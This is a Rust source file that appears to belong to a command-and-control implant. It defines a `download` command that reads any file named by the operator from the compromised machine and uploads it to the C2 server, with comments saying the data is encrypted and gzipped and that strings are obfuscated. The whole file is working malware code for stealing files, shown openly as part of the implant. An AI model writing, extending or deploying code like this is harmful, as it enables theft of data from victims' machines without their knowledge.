use crate::app::client::Client;
use fmtools::format; // using obfstr to obfuscate
use std::path::Path;

// Download a file from the implant and send it to the C2 server
pub(crate) fn download(guid: &str, filename: &String, client: &Client) -> String {
    // Check if the filename is empty
    if filename.is_empty() {
        return format!("Invalid number of arguments received. Usage: 'download [remote file] <optional: local destination path>'.");
    }

    // Check if the target file exists and it is a valid file
    let file_path = Path::new(&filename);
    if !file_path.exists() || !file_path.is_file() {
        return format!("The file '"{filename}"' does not exist or is not a valid file.");
    }

    // Read the file data
    let data = match std::fs::read(filename) {
        Ok(data) => data,
        Err(e) => return format!("Failed to read '"{filename}"': "{e}"."),
    };

    // Upload the file as a POST with encrypt(gzip(file_data))
    match client.post_file(guid, &data) {
        Ok(()) => {
            format!("") // Server will know whether the file came in correctly
        }
        Err(e) => {
            format!("Failed to upload '"{filename}"': "{e}".")
        }
    }
}
